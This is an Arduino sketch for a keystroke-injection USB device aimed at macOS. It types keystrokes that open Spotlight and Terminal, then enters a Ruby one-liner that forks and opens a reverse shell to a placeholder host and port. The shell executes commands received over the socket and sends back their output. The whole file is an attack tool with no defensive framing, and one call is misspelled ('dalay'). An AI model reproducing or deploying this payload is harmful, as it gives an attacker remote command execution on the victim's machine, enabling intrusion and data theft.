void setup()
{
  Keyboard.begin();
}
void loop()
{
  
  delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print(F("ruby -rsocket -e 'exit if fork;"));
  delay(100);
  Keyboard.print(F("c=TCPSocket.new"));
  delay(100);
  Keyboard.print(F("(\"INPUT0\",\"INPUT1\""));
  delay(100);
  Keyboard.print(F(");while(cmd=c.gets);IO.popen"));
  delay(100);
  Keyboard.println(F("(cmd,\"r\"){|io|c.print io.read}end'"));
  delay(100);
  while(true);  
}

void run(char *SomeCommand){
  //on Yosemite you launch spotlight with CTRL+SPACEBAR
  //not APPLE+SPACEBAR
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(' ');
  dalay(500);
  Keyboard.releaseAll();

  Keyboard.println(SomeCommand);
}


